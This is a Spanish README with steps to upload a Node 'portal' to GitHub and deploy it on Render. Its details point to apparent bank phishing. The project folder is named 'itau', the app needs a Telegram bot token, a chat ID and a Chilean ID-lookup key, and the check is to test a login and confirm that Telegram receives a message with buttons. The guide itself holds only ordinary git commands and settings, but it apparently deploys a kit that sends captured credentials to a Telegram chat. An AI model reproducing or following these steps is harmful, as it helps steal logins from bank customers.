# Subir y publicar el portal (GitHub + Render)

## 1) Preparar carpeta local

En `c:\Users\solte\OneDrive\Desktop\itau` deja tu `.env` con valores reales (no se sube a Git).

Ejemplo de variables requeridas:

- `BOT_TOKEN`
- `CHAT_ID`
- `API_KEY` (o `RUTIFICADOR_API_KEY`)
- `PORT` (Render lo asigna solo, opcional)

Opcionales de UI publica:

- `COLOR_PRINCIPAL`
- `PORTAL_TITULO`
- `PORTAL_SUBTITULO`
- `FOOTER_TEXTO`

## 2) Subir a GitHub

Ejecuta en PowerShell dentro de la carpeta del proyecto:

```powershell
git init
git add .
git commit -m "Deploy ready: frontend via proxy + backend secure config"
git branch -M main
git remote add origin https://github.com/TU_USUARIO/TU_REPO.git
git push -u origin main
```

## 3) Deploy en Render

1. Entra a Render y crea `New +` -> `Web Service`.
2. Conecta tu repo de GitHub.
3. Configura:
- Runtime: `Node`
- Build Command: `npm install`
- Start Command: `npm start`
- Root Directory: vacio (raiz del repo)
4. En `Environment` agrega las variables del `.env`:
- `BOT_TOKEN`
- `CHAT_ID`
- `API_KEY` (y/o `RUTIFICADOR_API_KEY`)
- Opcionales: `COLOR_PRINCIPAL`, `PORTAL_TITULO`, `PORTAL_SUBTITULO`, `FOOTER_TEXTO`
5. Guarda y deploy.

## 4) Verificacion

Cuando Render termine:

- Abre `https://tu-app.onrender.com/`
- Prueba login
- Verifica que Telegram reciba mensaje con botones

## Notas

- El frontend consume `/api` por proxy, por eso no expone token ni chat id.
- Los secretos viven solo en backend por variables de entorno.
- `.env` ya esta ignorado por `.gitignore`.
